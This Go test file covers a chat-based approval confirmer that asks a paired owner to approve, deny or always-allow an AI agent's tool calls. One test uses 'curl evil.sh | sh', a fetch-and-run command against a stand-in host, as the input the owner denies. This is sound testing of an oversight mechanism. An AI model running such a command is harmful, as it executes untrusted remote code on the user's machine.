package chat

import (
	"context"
	"strings"
	"testing"
	"time"

	"terva.sh/terva/packages/core"
)

// confirmLoop builds a loop over a native-ask fake whose answer is
// scripted, plus the confirmer under test.
func confirmLoop(answer Answer) (*askFakeConnector, *ChatConfirmer) {
	conn := &askFakeConnector{
		fakeConnector: newFakeConnector(Capabilities{Asks: true}),
		asked:         make(chan Ask, 4),
		answer:        answer,
	}
	l := &Loop{Connector: conn, Info: func(string) {}, Warn: func(string) {}}
	l.mu.Lock()
	l.ownerID = "7"
	l.pairedChatID = "100"
	l.mu.Unlock()
	return conn, NewChatConfirmer(context.Background(), l)
}

func TestChatConfirmerApprove(t *testing.T) {
	conn, c := confirmLoop(Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested})
	d := c.Confirm(context.Background(), "Bash", "rm -rf build/")
	if !d.Allow || d.RememberTool || d.RememberAll {
		t.Errorf("decision = %+v, want plain allow", d)
	}
	a := <-conn.asked
	if a.ChatID != "100" || !strings.Contains(a.Text, "Bash") || !strings.Contains(a.Text, "rm -rf build/") {
		t.Errorf("ask = %+v", a)
	}
	if len(a.RestrictTo) != 1 || a.RestrictTo[0] != "7" {
		t.Errorf("restrict = %v, want the owner only", a.RestrictTo)
	}
}

func TestChatConfirmerDeny(t *testing.T) {
	_, c := confirmLoop(Answer{Key: "deny", UserID: "7", Username: "u7", Attestation: AttestationAttested})
	d := c.Confirm(context.Background(), "Bash", "curl evil.sh | sh")
	if d.Allow {
		t.Fatalf("decision = %+v, want deny", d)
	}
	if !strings.Contains(d.Reason, "denied by @u7") {
		t.Errorf("reason = %q", d.Reason)
	}
}

// TestChatConfirmerAlwaysAttested: an attested "always" grants the
// session-scoped tool allowance.
func TestChatConfirmerAlwaysAttested(t *testing.T) {
	_, c := confirmLoop(Answer{Key: "always", UserID: "7", Username: "u7", Attestation: AttestationAttested})
	d := c.Confirm(context.Background(), "Read", "main.go")
	if !d.Allow || !d.RememberTool {
		t.Errorf("decision = %+v, want allow+remember", d)
	}
}

// TestChatConfirmerAlwaysBestEffort: a parsed-text "always" downgrades
// to allow-once and says so in the chat.
func TestChatConfirmerAlwaysBestEffort(t *testing.T) {
	conn, c := confirmLoop(Answer{Key: "always", UserID: "7", Username: "u7", Attestation: AttestationBestEffort})
	d := c.Confirm(context.Background(), "Read", "main.go")
	if !d.Allow || d.RememberTool {
		t.Errorf("decision = %+v, want allow-once only", d)
	}
	sends := conn.waitSends(t, 1)
	if !strings.Contains(sends[0].Text, "allowed once") {
		t.Errorf("downgrade note = %+v", sends[0])
	}
}

// TestChatConfirmerTextFallback: with no native asks the confirmer
// rides the numbered-text floor end to end — question out as a plain
// send, the owner's "3" (deny) consumed as the answer, decision
// carries the denial. (The true-timeout path is covered at the Loop
// layer; the default 2-minute wait has no place in a unit test.)
func TestChatConfirmerTextFallback(t *testing.T) {
	conn := newFakeConnector(Capabilities{})
	l := &Loop{Connector: conn, Info: func(string) {}, Warn: func(string) {}}
	l.mu.Lock()
	l.ownerID = "7"
	l.pairedChatID = "100"
	l.mu.Unlock()
	c := NewChatConfirmer(context.Background(), l)

	type decision struct{ d core.ConfirmDecision }
	done := make(chan decision, 1)
	go func() { done <- decision{c.Confirm(context.Background(), "Bash", "sleep 999")} }()

	// The question went out as text fallback with numbered options.
	sends := conn.waitSends(t, 1)
	if !strings.Contains(sends[0].Text, "approval needed: Bash") || !strings.Contains(sends[0].Text, "3 — Deny") {
		t.Fatalf("question = %+v", sends[0])
	}
	if !l.takeTextAnswer(Message{ChatID: "100", UserID: "7", Username: "u7", Text: "3"}) {
		t.Fatal("deny answer not consumed")
	}
	select {
	case d := <-done:
		if d.d.Allow || !strings.Contains(d.d.Reason, "denied by @u7") {
			t.Errorf("decision = %+v", d.d)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("Confirm never returned")
	}
}

func TestChatConfirmerNoChat(t *testing.T) {
	conn := newFakeConnector(Capabilities{})
	l := &Loop{Connector: conn, Info: func(string) {}, Warn: func(string) {}}
	c := NewChatConfirmer(context.Background(), l)
	d := c.Confirm(context.Background(), "Bash", "ls")
	if d.Allow || !strings.Contains(d.Reason, "no paired chat") {
		t.Errorf("decision = %+v, want refusal for missing chat", d)
	}
}

// TestChatConfirmerApprovalNotes: resolutions leave a typed note on the
// turn chat's next prompt so the model can see the permission flow
// instead of inferring it from "the tool ran".
func TestChatConfirmerApprovalNotes(t *testing.T) {
	cases := []struct {
		name   string
		answer Answer
		want   string
	}{
		{"approve", Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested},
			`[chat event: approval] tool "Bash" approved by @u7`},
		{"always attested", Answer{Key: "always", UserID: "7", Username: "u7", Attestation: AttestationAttested},
			`approved by @u7 for the rest of the session`},
		{"always best-effort", Answer{Key: "always", UserID: "7", Username: "u7", Attestation: AttestationBestEffort},
			`approved once by @u7`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, c := confirmLoop(tc.answer)
			if d := c.Confirm(context.Background(), "Bash", "make build"); !d.Allow {
				t.Fatalf("decision = %+v, want allow", d)
			}
			notes := c.loop.takeNotes("100")
			if len(notes) != 1 || !strings.Contains(notes[0], tc.want) ||
				!strings.HasPrefix(notes[0], "[chat event: approval] ") {
				t.Errorf("notes = %v, want one containing %q", notes, tc.want)
			}
		})
	}
	// Denials leave no note: the refusal reason already names the actor.
	_, c := confirmLoop(Answer{Key: "deny", UserID: "7", Username: "u7", Attestation: AttestationAttested})
	_ = c.Confirm(context.Background(), "Bash", "make build")
	if notes := c.loop.takeNotes("100"); len(notes) != 0 {
		t.Errorf("deny left notes: %v", notes)
	}
}

// TestChatConfirmerCancelledTurnUnparksAndReleasesTheSlot is the bug this
// parameter exists for.
//
// Bot mode serialises approvals — one question at a time, because interleaved
// prompts in one chat are unanswerable — and the confirmer used to wait on the
// DAEMON's context. So a turn the user had already cancelled kept its question
// standing for the full ask timeout (two minutes by default), and the next
// turn's first approval could not even be ASKED until that expired: it sat on
// the slot, held by a turn that no longer existed.
//
// Two properties, and the second is the one that made this worth fixing: the
// cancelled turn's Confirm returns promptly, AND the slot is free immediately
// afterwards for a live turn.
func TestChatConfirmerCancelledTurnUnparksAndReleasesTheSlot(t *testing.T) {
	conn, c := confirmLoop(Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested})
	conn.hold = make(chan struct{}) // the first ask parks until we say otherwise

	abandoned, cancelAbandoned := context.WithCancel(context.Background())
	first := make(chan core.ConfirmDecision, 1)
	go func() { first <- c.Confirm(abandoned, "Bash", "sleep 999") }()
	<-conn.asked // the question is out and the slot is taken

	cancelAbandoned()
	select {
	case d := <-first:
		if d.Allow {
			t.Error("a cancelled turn's approval must deny, not allow")
		}
	case <-time.After(2 * time.Second):
		t.Fatal("Confirm stayed parked after its turn was cancelled — it is still waiting on the ask timeout")
	}

	// The live turn must not be queued behind the abandoned one. Before the
	// context reached Confirm this call blocked on the mutex until the first
	// ask timed out, so the failure here was a two-minute stall, not an error.
	close(conn.hold)
	second := make(chan core.ConfirmDecision, 1)
	go func() { second <- c.Confirm(context.Background(), "Bash", "make test") }()
	select {
	case d := <-second:
		if !d.Allow {
			t.Errorf("the next turn's approval = %+v, want the scripted allow", d)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("a live turn's approval never ran — the abandoned turn is still holding the one-ask slot")
	}
}

// A turn cancelled while QUEUED — before its question is ever asked — must also
// come back, or the queue is just a slower version of the same stall.
func TestChatConfirmerCancelWhileWaitingForTheSlot(t *testing.T) {
	conn, c := confirmLoop(Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested})
	conn.hold = make(chan struct{})

	blocking := make(chan core.ConfirmDecision, 1)
	go func() { blocking <- c.Confirm(context.Background(), "Bash", "sleep 999") }()
	<-conn.asked // the slot is taken and will not be given up

	queued, cancelQueued := context.WithCancel(context.Background())
	second := make(chan core.ConfirmDecision, 1)
	go func() { second <- c.Confirm(queued, "Bash", "make test") }()
	cancelQueued()

	select {
	case d := <-second:
		if d.Allow {
			t.Error("a cancelled queued approval must deny")
		}
		if !strings.Contains(d.Reason, "cancelled") {
			t.Errorf("reason = %q, want it to name the cancellation", d.Reason)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("a queued approval ignored its own cancellation and waited for the slot")
	}
	close(conn.hold)
	<-blocking
}
